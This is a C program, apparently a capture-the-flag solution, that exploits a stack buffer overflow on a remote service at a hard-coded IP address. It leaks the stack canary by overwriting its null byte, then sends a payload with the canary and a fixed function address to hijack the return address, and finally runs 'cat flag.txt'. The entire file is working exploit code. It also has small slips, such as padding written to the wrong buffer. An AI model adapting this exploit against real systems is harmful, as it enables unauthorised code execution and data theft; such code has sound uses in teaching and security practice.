#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define READ 0
#define WRITE 1

int main(){
    int ctf_socket = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in servaddr;
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr("153.125.146.144");
    servaddr.sin_port = htons(9001);
    int rc = connect(ctf_socket, (struct sockaddr*)&servaddr, sizeof(servaddr));
    if(rc < 0){ printf("connect error\n"); exit(0);}

    char buffer[1024];
    int size;
    sleep(1);
    memset(buffer, 0, 1024);
    size = read(ctf_socket, buffer, 1024);
    printf("%s", buffer);

    char c = 'A', b = 'B';
    char garbage[41] = {0};
    for(int i = 0; i < 40; i++){
        garbage[i] = c;
    }
    garbage[40] = b;
    write(ctf_socket, garbage, 41);

    sleep(1);
    memset(buffer, 0, 1024);
    size = read(ctf_socket, buffer, 1024);
    printf("%s", buffer);
    unsigned char canary[8];
    int canary_ind = -1;
    for(int i = 0; i < 1024; i++){
        if(buffer[i] == 'B'){
            canary[0] = 0;
            canary_ind = 1;
            continue;
        }
        if(canary_ind >= 0 && canary_ind < 8){
            canary[canary_ind] = buffer[i];
            canary_ind++;
        }
    }
    printf("\ncanary = 0x");
    for(int i = 0; i< 8 ; i++){
        printf("%02x", canary[i]);
    }
    printf("\n");

    char newgarbage[64] = {0};
    for(int i = 0; i < 40; i++){
        garbage[i] = c;
    }
    memcpy(newgarbage + 40, canary, 8);
    char rbps[8] = {0};
    char winaddress[8] = { 0xd6, 0x12, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00 };
    memcpy(newgarbage + 48, rbps, 8);
    memcpy(newgarbage + 56, winaddress, 8);
    write(ctf_socket, newgarbage, 64);

    sleep(1);
    memset(buffer, 0, 1024);
    size = read(ctf_socket, buffer, 1024);
    printf("%s", buffer);
    printf("\n");

    write(ctf_socket, "cat flag.txt\n", 15);
    sleep(1);
    memset(buffer, 0, 1024);
    size = read(ctf_socket, buffer, 1024);
    printf("%s", buffer);
}
